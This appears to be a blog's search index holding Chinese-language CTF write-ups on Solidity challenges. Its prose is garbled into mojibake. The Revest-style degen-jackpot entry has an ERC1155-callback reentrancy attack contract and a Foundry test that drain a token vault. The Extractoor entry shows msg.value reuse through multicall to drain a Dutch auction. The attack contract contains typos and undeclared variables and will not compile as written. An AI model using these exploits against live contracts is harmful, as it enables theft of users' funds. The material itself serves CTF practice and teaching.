<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-degen-jackpot</title>
      <link href="/2024/10/30/CTF-degen-jackpot/"/>
      <url>/2024/10/30/CTF-degen-jackpot/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-degen-jackpot"><a href="#CTF-degen-jackpot" class="headerlink" title="CTF-degen-jackpot"></a>CTF-degen-jackpot</h1><p>é¢˜ç›®æºä»£ç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/degen-jackpot">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚ï¼šé¦–å…ˆåˆçº¦æœ‰1000ä¸ªä»£å¸ï¼Œä½ åˆå§‹æœ‰ä¸€ä¸ªä»£å¸ï¼Œä½ çš„ä»»åŠ¡æ˜¯æå–å…¨éƒ¨çš„ä»£å¸ä»åˆçº¦ä¸­ã€‚</p><p>è¿™ä¸ªé¢˜åˆçº¦çœ‹ä¼¼å¾ˆå¤šï¼Œå…¶å®åŠŸèƒ½æ˜æ˜¾<br>FNFTHHandleråˆçº¦æ˜¯è¿™ä¸ªå¸çš„ä¸€äº›æ“ä½œ<br>LockManageråˆçº¦æ˜¯è¿›è¡Œé”å®šåœ°å€çš„æ“ä½œ<br>OtherContract åˆçº¦ï¼Œå°±æ˜¯å…¶ä»–åˆçº¦<br>OtherInterface åˆçº¦ï¼Œå°±æ˜¯æ¥å£çš„å®ç°ï¼Œå¯ä»¥åœ¨è¿™é‡Œçœ‹è§åˆçº¦çš„ä¸€äº›åŠŸèƒ½å‡½æ•°ã€‚<br>Revert åˆçº¦ï¼Œè¿™ä¸ªå°±æ˜¯ä¸»åˆçº¦äº†ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¦é‡ç‚¹åˆ†æçš„åˆçº¦<br>TokenVaultåˆçº¦ï¼Œæ˜¾è€Œæ˜“è§ã€‚é‡‘åº“åˆçº¦ï¼Œ</p><p>è¦æƒ³å–å¾—å…¨éƒ¨ä»£å¸ï¼Œè¿˜æ˜¯å…ˆçœ‹é‚£é‡Œå¯ä»¥è½¬å‡ºï¼Œ<br>åœ¨Revertåˆçº¦ä¸­ï¼Œæœ‰ä¸ªæ’¤å›å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawFNFT(uint fnftId, uint quantity) external override revestNonReentrant(fnftId) &#123;</span><br><span class="line">      address fnftHandler = addressesProvider.getRevestFNFT();</span><br><span class="line">      // Check if this many FNFTs exist in the first place for the given ID</span><br><span class="line">      require(quantity &lt;= IFNFTHandler(fnftHandler).getSupply(fnftId), &quot;E022&quot;);</span><br><span class="line">      // Check if the user making this call has this many FNFTs to cash in</span><br><span class="line">      require(quantity &lt;= IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId), &quot;E006&quot;);</span><br><span class="line">      // Check if the user making this call has any FNFT&#x27;s</span><br><span class="line">      require(IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId) &gt; 0, &quot;E032&quot;);</span><br><span class="line"></span><br><span class="line">      IRevest.LockType lockType = getLockManager().lockTypes(fnftId);</span><br><span class="line">      require(lockType != IRevest.LockType.DoesNotExist, &quot;E007&quot;);</span><br><span class="line">      require(getLockManager().unlockFNFT(fnftId, _msgSender()),&quot;E019&quot;);</span><br><span class="line">      // Burn the FNFTs being exchanged</span><br><span class="line">      burn(_msgSender(), fnftId, quantity);</span><br><span class="line">      getTokenVault().withdrawToken(fnftId, quantity, _msgSender());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¦å…ˆçŸ¥é“è¿™è¯ä»£å¸çš„idï¼Œè¿™æ˜¯ä¸€ä¸ªæ£˜æ‰‹çš„äº‹ï¼Œæ€è€ƒé¢˜ç›®ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªä»£å¸ï¼Œå¯ä»¥ç»™åˆçº¦è½¬è´¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function depositAdditionalToFNFT(</span><br><span class="line">       uint fnftId,</span><br><span class="line">       uint amount,</span><br><span class="line">       uint quantity</span><br><span class="line">   ) external override returns (uint) &#123;</span><br><span class="line">       IRevest.FNFTConfig memory fnft = getTokenVault().getFNFT(fnftId);</span><br><span class="line">       require(fnftId &lt; getFNFTHandler().getNextId(), &quot;E007&quot;);</span><br><span class="line">       require(quantity &gt; 0, &quot;E070&quot;);</span><br><span class="line"></span><br><span class="line">       address vault = addressesProvider.getTokenVault();</span><br><span class="line">       address handler = addressesProvider.getRevestFNFT();</span><br><span class="line">       address lockHandler = addressesProvider.getLockManager();</span><br><span class="line"></span><br><span class="line">       bool createNewSeries = false;</span><br><span class="line">       &#123;</span><br><span class="line">           uint supply = IFNFTHandler(handler).getSupply(fnftId);</span><br><span class="line"></span><br><span class="line">           uint balance = IFNFTHandler(handler).getBalance(_msgSender(), fnftId);</span><br><span class="line"></span><br><span class="line">           if (quantity &gt; balance) &#123;</span><br><span class="line">               require(quantity == supply, &quot;E069&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           else if (quantity &lt; balance || balance &lt; supply) &#123;</span><br><span class="line">               createNewSeries = true;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       uint lockId = ILockManager(lockHandler).fnftIdToLockId(fnftId);</span><br><span class="line"></span><br><span class="line">       // Whether to split the new deposits into their own series, or to simply add to an existing series</span><br><span class="line">       uint newFNFTId;</span><br><span class="line">       if(createNewSeries) &#123;</span><br><span class="line">           // Split into a new series</span><br><span class="line">           newFNFTId = IFNFTHandler(handler).getNextId();</span><br><span class="line">           ILockManager(lockHandler).pointFNFTToLock(newFNFTId, lockId);</span><br><span class="line">           burn(_msgSender(), fnftId, quantity);</span><br><span class="line">           IFNFTHandler(handler).mint(_msgSender(), newFNFTId, quantity, &quot;&quot;);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           // Stay the same</span><br><span class="line">           newFNFTId = 0; // Signals to handleMultipleDeposits()</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // Will call updateBalance</span><br><span class="line">       ITokenVault(vault).depositToken(fnftId, amount, quantity);</span><br><span class="line">       // Now, we transfer to the token vault</span><br><span class="line">       if(fnft.asset != address(0))&#123;</span><br><span class="line">           IERC20(fnft.asset).safeTransferFrom(_msgSender(), vault, quantity * amount);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       ITokenVault(vault).handleMultipleDeposits(fnftId, newFNFTId, fnft.depositAmount + amount);</span><br><span class="line"></span><br><span class="line">       return newFNFTId;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ï¼Œè½¬è´¦å¯ä»¥mint æ–°çš„id,å†æ¥çœ‹çœ‹mintå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function mint(address account, uint id, uint amount, bytes memory data) external override onlyRevestController &#123;</span><br><span class="line">        supply[id] += amount;</span><br><span class="line">        _mint(account, id, amount, data);</span><br><span class="line">        fnftsCreated += 1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰æƒ³åˆ°æ›´æ–°idç›´æ¥å°±æ˜¯+1ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥è½¬è´¦ä»£å¸ç»™åˆçº¦ï¼Œæ›´æ–°id,ç„¶åå†æ’¤å›å…¨éƒ¨ä»£å¸<br>æ”»å‡»åˆçº¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IRevert&#123;</span><br><span class="line">     function withdrawFNFT(uint fnftId, uint quantity) external ;</span><br><span class="line">      function depositAdditionalToFNFT(</span><br><span class="line">        uint fnftId,</span><br><span class="line">        uint amount,</span><br><span class="line">        uint quantity</span><br><span class="line">    ) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    IRevert revert;</span><br><span class="line">    IREC20 gov;</span><br><span class="line">     address attracker;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _revert,address _gov)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        revert = IRevert(_revert);</span><br><span class="line">        gov =IERC20(_gov);</span><br><span class="line">        attracker = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function setTrigger(bool _trigger) external &#123;</span><br><span class="line">        triggerCallback = _trigger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Callback during _mint</span><br><span class="line">    function onERC1155Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256 id,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        if (triggerCallback) &#123;</span><br><span class="line">            // depositAdditionalToFNFT will call mint again, triggering onERC1155Received</span><br><span class="line">            // we don&#x27;t want this to happen, so we set triggerCallback to false</span><br><span class="line">            triggerCallback=false;</span><br><span class="line">            revest.depositAdditionalToFNFT(1, 1e18, 1); // updates the depositAmount for fnftId=2 to 1e18</span><br><span class="line">            revest.withdrawFNFT(2, 100_001); // withdraw 100_001 from fnftId=2</span><br><span class="line">            gov.transfer(attacker,gov.balanceOf(address(this))); // send GOV tokens to attacker</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC1155BatchReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256[] calldata ids,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        return bytes4(0); // not accepted</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜çš„åŸå‹ï¼Œå¯ä»¥çœ‹çœ‹<a href="https://rekt.news/revest-finance-rekt/">ç‚¹å‡»</a>;<br>æµ‹è¯•åˆçº¦ä¹Ÿå¯ä»¥çœ‹çœ‹;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// utilities</span><br><span class="line">import &#123;Test&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;console&#125; from &quot;forge-std/console.sol&quot;;</span><br><span class="line">// core contracts</span><br><span class="line">import &#123;Token&#125; from &quot;src/other/Token.sol&quot;;</span><br><span class="line">import &#123;Revest&#125; from &quot;src/degen-jackpot/Revest.sol&quot;;</span><br><span class="line">import &#123;LockManager&#125; from &quot;src/degen-jackpot/LockManager.sol&quot;;</span><br><span class="line">import &#123;TokenVault&#125; from &quot;src/degen-jackpot/TokenVault.sol&quot;;</span><br><span class="line">import &#123;FNFTHandler&#125; from &quot;src/degen-jackpot/FNFTHandler.sol&quot;;</span><br><span class="line">import &#123;AddressRegistry&#125; from &quot;src/degen-jackpot/OtherContracts.sol&quot;;</span><br><span class="line">import &#123;IRevest&#125; from &quot;src/degen-jackpot/OtherInterfaces.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &#123;RevestExploiter&#125; from &quot;src/degen-jackpot/RevestExploiter.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Testing is Test &#123;</span><br><span class="line"></span><br><span class="line">    address attacker = makeAddr(&#x27;attacker&#x27;);</span><br><span class="line">    address o1 = makeAddr(&#x27;o1&#x27;);</span><br><span class="line">    address o2 = makeAddr(&#x27;o2&#x27;);</span><br><span class="line">    address admin = makeAddr(&#x27;admin&#x27;); // should not be used</span><br><span class="line">    address adminUser = makeAddr(&#x27;adminUser&#x27;); // should not be used</span><br><span class="line"></span><br><span class="line">    Token gov;</span><br><span class="line">    Revest revest;</span><br><span class="line">    LockManager lockManager;</span><br><span class="line">    TokenVault tokenVault;</span><br><span class="line">    FNFTHandler fnftHandler;</span><br><span class="line">    AddressRegistry addressRegistry;</span><br><span class="line"></span><br><span class="line">    /// preliminary state</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line"></span><br><span class="line">        // funding accounts</span><br><span class="line">        vm.deal(admin, 10_000 ether);</span><br><span class="line">        vm.deal(attacker, 10_000 ether);</span><br><span class="line">        vm.deal(adminUser, 10_000 ether);</span><br><span class="line"></span><br><span class="line">        // deploying token contract</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        gov = new Token(&#x27;GOV&#x27;,&#x27;GOV&#x27;);</span><br><span class="line"></span><br><span class="line">        address[] memory addresses = new address[](2);</span><br><span class="line">        uint256[] memory amounts = new uint256[](2);</span><br><span class="line"></span><br><span class="line">        addresses[0]=adminUser; addresses[1]=attacker;</span><br><span class="line">        amounts[0]=100_000e18; amounts[1]=1e18;</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        gov.mintPerUser(addresses,amounts);</span><br><span class="line"></span><br><span class="line">        // deploying core contracts</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        addressRegistry = new AddressRegistry();</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        revest = new Revest(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        lockManager = new LockManager(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        tokenVault = new TokenVault(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        fnftHandler = new FNFTHandler(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.startPrank(admin);</span><br><span class="line">        addressRegistry.setLockManager(address(lockManager));</span><br><span class="line">        addressRegistry.setTokenVault(address(tokenVault));</span><br><span class="line">        addressRegistry.setRevestFNFT(address(fnftHandler));</span><br><span class="line">        addressRegistry.setRevest(address(revest));</span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        // --adminUser deposits GOV token into Revest vault</span><br><span class="line">        vm.prank(adminUser);</span><br><span class="line">        gov.approve(address(revest),100_000e18);</span><br><span class="line"></span><br><span class="line">        address[] memory recipients = new address[](1);</span><br><span class="line">        recipients[0]=adminUser;</span><br><span class="line">        uint256[] memory quantities = new uint256[](1);</span><br><span class="line">        quantities[0]=100;</span><br><span class="line">        bytes memory arguments;</span><br><span class="line"></span><br><span class="line">        IRevest.FNFTConfig memory fnftConfig;</span><br><span class="line">        fnftConfig.asset = address(gov);</span><br><span class="line">        fnftConfig.depositAmount=1_000e18;</span><br><span class="line"></span><br><span class="line">        vm.prank(adminUser);</span><br><span class="line">        revest.mintAddressLock(</span><br><span class="line">            adminUser,</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// solves the challenge</span><br><span class="line">    function testChallengeExploit() public &#123;</span><br><span class="line">        vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">        RevestExploiter exploiter = new RevestExploiter(address(revest),address(gov));</span><br><span class="line"></span><br><span class="line">        address[] memory recipients = new address[](1);</span><br><span class="line">        recipients[0]=address(exploiter);</span><br><span class="line">        uint256[] memory quantities = new uint256[](1);</span><br><span class="line">        quantities[0]=2;</span><br><span class="line">        bytes memory arguments;</span><br><span class="line"></span><br><span class="line">        IRevest.FNFTConfig memory fnftConfig;</span><br><span class="line">        fnftConfig.asset = address(gov);</span><br><span class="line"></span><br><span class="line">        revest.mintAddressLock( // fnftId=1</span><br><span class="line">            address(exploiter),</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        gov.transfer(address(exploiter),1e18);</span><br><span class="line">        exploiter.setTrigger(true);</span><br><span class="line"></span><br><span class="line">        quantities[0]=100_001;</span><br><span class="line"></span><br><span class="line">        revest.mintAddressLock( // fnftId=2</span><br><span class="line">            address(exploiter),</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        validation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// expected final state</span><br><span class="line">    function validation() public &#123;</span><br><span class="line"></span><br><span class="line">        // attacker acquires all GOV tokens that were deposited into the Revest contract</span><br><span class="line">        assertEq(gov.balanceOf(address(tokenVault)),0);</span><br><span class="line">        assertEq(gov.balanceOf(attacker),100_001e18);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œç»“ï¼›<br>è¡¥å……ï¼š</p><ul><li><p>mintAddressLock å‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„ FNFTï¼Œå¹¶ä¸ºå…¶è®¾ç½®ä¸€ä¸ªåœ°å€é”ï¼Œè¿™æ ·åªæœ‰ç‰¹å®šçš„åœ°å€æ‰èƒ½è§£é”è¿™äº› FNFTã€‚è¿™ä½¿å¾— FNFT å¯ä»¥ä¸ç‰¹å®šçš„æ¡ä»¶ç»‘å®šï¼Œæä¾›æ›´å¤æ‚çš„é”å®šå’Œè§£é”æœºåˆ¶ï¼Œå¢å¼ºäº†åˆçº¦çš„çµæ´»æ€§å’Œå®‰å…¨æ€§ã€‚</p></li><li><p>address trigger: è§¦å‘é”å®šè§£é™¤çš„åœ°å€ã€‚å½“æ»¡è¶³æŸäº›æ¡ä»¶æ—¶ï¼Œè¿™ä¸ªåœ°å€å°†èƒ½å¤Ÿè§£é”å¯¹åº”çš„ FNFTã€‚</p></li><li><p>bytes memory arguments: ç”¨äºä¼ é€’å…¶ä»–å¯èƒ½éœ€è¦çš„å‚æ•°ï¼Œå…·ä½“ç”¨é€”å–å†³äºå®ç°ã€‚</p></li><li><p>address[] memory recipients: æ¥æ”¶ FNFT çš„åœ°å€æ•°ç»„ã€‚</p></li><li><p>uint[] memory quantities: å¯¹åº”æ¯ä¸ªæ¥æ”¶åœ°å€çš„ FNFT æ•°é‡æ•°ç»„ã€‚<br>IRevest.FNFTConfig memory fnftConfig: FNFT çš„é…ç½®ï¼ŒåŒ…æ‹¬èµ„äº§ç±»å‹å’Œå­˜æ¬¾é‡‘é¢ç­‰ã€‚</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-opyn-sesame</title>
      <link href="/2024/10/30/CTF-opyn-sesame/"/>
      <url>/2024/10/30/CTF-opyn-sesame/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-opyn-sesame"><a href="#CTF-opyn-sesame" class="headerlink" title="CTF-opyn-sesame"></a>CTF-opyn-sesame</h1><p>é¢˜ç›®æºä»£ç ï¼š<a href="">ç‚¹å‡»</a></p><p>è¦æ±‚æ˜¯ï¼šè·å¾—åˆçº¦ä¸­æ‰€æœ‰çš„ä½™é¢</p><p>å’Œä¹‹å‰é‚£ä¸ªçœ‹æ¶¨æœŸæƒæœ‰ç‚¹åƒï¼Œè¿™ä¸ªæ˜¯çœ‹è·ŒæœŸæƒï¼Œæ‰€è¿˜æ˜¯çš„å¯¹è¿™ä¸ªè‚¡å¸‚çš„ä¸€äº›ä¸“æœ‰çš„è¯ä¸€äº›ç†è§£ï¼Œè¿™ç¯‡æ–‡ç« å†™çš„å¾ˆå¥½<a href="https://xueqiu.com/6489791900/299846807">ç‚¹å‡»</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>capture the ether</title>
      <link href="/2024/10/30/capture-the-ether/"/>
      <url>/2024/10/30/capture-the-ether/</url>
      
        <content type="html"><![CDATA[<p>å¯¹äºéšæœºæ•°ï¼Œæ¥å®ç°ä¸€ä¸ªæ›´å¥½çš„ç†è§£ã€‚</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> é¢˜è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Extractoor</title>
      <link href="/2024/10/28/CTF-Extractoor/"/>
      <url>/2024/10/28/CTF-Extractoor/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Etractoor"><a href="#CTF-Etractoor" class="headerlink" title="CTF-Etractoor"></a>CTF-Etractoor</h1><p>é¢˜ç›®æºä»£ç ï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/extractoor">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚ï¼š<br>å·²ç»å¯åŠ¨äº†ä¸€åœºè·å…°æ‹å–ï¼Œä»¥å‡ºå”® 1_000_000 ä¸ª FARM ä»£å¸ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä¸€ä¸ª degen å·²ç»æŠ•å…¥äº† 900 ETHã€‚</p><p>æ‚¨çš„ä»»åŠ¡æ˜¯ä» DutchAuction åˆçº¦ä¸­çªƒå–è‡³å°‘ 90% çš„ ETHã€‚</p><p>è¿™æ¬¡åˆçº¦å°±åªæœ‰ä¸€ä¸ªï¼Œå®ç°çš„æ˜¯è·å…°æ‹å–ï¼Œæˆ‘ä»¬è¦è·å–ethï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å…ˆçœ‹åˆçº¦ä¸­ï¼Œé‚£ä¸ªåœ°æ–¹å¯ä»¥è·å¾—eth,<br>å‘ç°commitETHåˆçº¦ä¸­ï¼Œèƒ½å¤Ÿè¿”å›eth,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function commitEth(address payable _beneficiary) public payable nonReentrant</span><br><span class="line">  &#123;</span><br><span class="line">      // Get ETH able to be committed</span><br><span class="line">      uint256 ethToTransfer = calculateCommitment(msg.value);</span><br><span class="line"></span><br><span class="line">      /// @notice Accept ETH Payments.</span><br><span class="line">      uint256 ethToRefund = msg.value - ethToTransfer;</span><br><span class="line">      if (ethToTransfer &gt; 0) &#123;</span><br><span class="line">          _addCommitment(_beneficiary, ethToTransfer);</span><br><span class="line">      &#125;</span><br><span class="line">      /// @notice Return any ETH to be refunded.</span><br><span class="line">      if (ethToRefund &gt; 0) &#123;</span><br><span class="line">          _beneficiary.transfer(ethToRefund);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆçº¦å°±æ˜¯è·å¾—ç”¨æˆ·æ‰¿è¯ºçš„é‡‘é¢ï¼Œè®¡ç®—æœ€å¤§çš„æ‰¿è¯ºä¸Šé™ï¼Œç„¶åå†ä¸ç”¨æˆ·æ‰¿è¯ºé‡‘é¢æ¯”è¾ƒï¼Œè®¡ç®—é€€å›çš„eth.</p><p>è¿˜æœ‰å°±åªå†æœ€åç»“ç®—çš„æ—¶å€™ï¼Œå¦‚æœæ‹å–éƒ¨æˆåŠŸï¼Œä¹Ÿä¼šé€€å›é‡‘é¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawTokens(address beneficiary) public nonReentrant &#123;</span><br><span class="line">      if (auctionSuccessful()) &#123;</span><br><span class="line">          require(marketStatus.finalized, &quot;DutchAuction: not finalized&quot;);</span><br><span class="line">          /// @dev Successful auction! Transfer claimed tokens.</span><br><span class="line">          uint256 tokensToClaim = tokensClaimable(beneficiary);</span><br><span class="line">          require(tokensToClaim &gt; 0, &quot;DutchAuction: No tokens to claim&quot;); </span><br><span class="line">          claimed[beneficiary] = claimed[beneficiary]+tokensToClaim;</span><br><span class="line">          IERC20(auctionToken).safeTransfer(beneficiary,tokensToClaim);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          /// @dev Auction did not meet reserve price.</span><br><span class="line">          /// @dev Return committed funds back to user.</span><br><span class="line">          require(block.timestamp &gt; marketInfo.endTime, &quot;DutchAuction: auction has not finished yet&quot;);</span><br><span class="line">          uint256 fundsCommitted = commitments[beneficiary];</span><br><span class="line">          commitments[beneficiary] = 0; // Stop multiple withdrawals and free some gas</span><br><span class="line"></span><br><span class="line">          (bool success,) = payable(beneficiary).call&#123;value:fundsCommitted&#125;(&#x27;&#x27;);</span><br><span class="line">          require(success, &#x27;ETH_TRANSFER_FAILED&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªå‡½æ•°å†finalizeå‡½æ•°ä¸­æ‰èƒ½è¢«ä½¿ç”¨ï¼Œè€Œä¸”è¿˜åªèƒ½æ˜¯ç®¡ç†è€…èº«ä»½è°ƒç”¨ï¼Œæ‰€ä»¥å°±è€ƒè™‘commitETHå‡½æ•°</p><p>åˆçº¦æœ¬èº«å¼€å¤´å°±å®ç°äº†ä¸€ä¸ªå¯ä»¥å¤šä¸ªå›è°ƒçš„å‡½æ•°ï¼Œè¯´æ˜è¿™é‡Œæ˜¯ä¸ªçªç ´å£ï¼Œç„¶åä»”ç»†å‘ç°commintETHå‡½æ•°ï¼Œä¸€ç›´ä½¿ç”¨çš„msg.value,å¦‚æœæˆ‘ä»¬èƒ½é‡å¤ä½¿ç”¨è¿™ä¸ªmsg.valueå°±å¯ä»¥é‡å¤çš„ä½¿ç”¨commintETH,é€€å›æ›´å¤šçš„ethï¼Œä¸ºè‡ªå·±åˆ›é€ åˆ©æ¶¦ã€‚</p><p>è¿™ä¸ªé¢˜å°±è§£å†³äº†<br>è¿™ä¸ªæ˜¯é¢˜è§£ä¸­ä¸€éƒ¨åˆ†æµ‹è¯•ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// solves the challenge</span><br><span class="line">  function testChallengeExploit() public &#123;</span><br><span class="line">      vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">      bytes memory singleCall = abi.encodeWithSignature(&quot;commitEth(address)&quot;,attacker);</span><br><span class="line">      bytes[] memory data = new bytes[](11);</span><br><span class="line"></span><br><span class="line">      for (uint i; i&lt;11; ++i) &#123;</span><br><span class="line">          data[i] = singleCall;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      bytes memory multiCall = abi.encodeWithSignature(&quot;multicall(bytes[])&quot;,data);</span><br><span class="line">      address(dutchAuction).call&#123;value:98e18&#125;(multiCall);</span><br><span class="line"></span><br><span class="line">      vm.stopPrank();</span><br><span class="line">      validation();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>(è¿˜æ˜¯çš„äº†è§£æ€ä¹ˆå†™ä»£ç ï¼Œä¸è¦åªçŸ¥é“æ€è·¯ï¼Œcallçš„ç”¨æ³•è¦è®°ä½)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-malleable</title>
      <link href="/2024/10/28/CTF-malleable/"/>
      <url>/2024/10/28/CTF-malleable/</url>
      
